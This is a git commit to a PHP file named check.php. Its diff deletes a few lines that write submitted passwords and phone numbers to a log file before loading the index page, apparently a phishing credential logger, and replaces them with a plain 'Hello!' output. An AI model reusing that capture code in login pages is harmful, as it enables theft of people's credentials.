521497aaa835407333fdadb5992e64305620751e
kotenbas <buianbaevzhasulan@gmail.com>
2020-05-15 00:03:09 +0600

    Update check.php

--- check.php
+++ check.php
@@ -1,7 +1,3 @@
-<?php header('Content-Type: text/html; charset=utf-8');
-    $fp = fopen('log.txt', 'a');
-    $loh =$_POST[pass]." ".$_POST[tel]." ";
-    fwrite($fp,$loh);
-    fclose($fp);
-    require "index.php";
+<?php
+    echo "Hello!"
 ?>
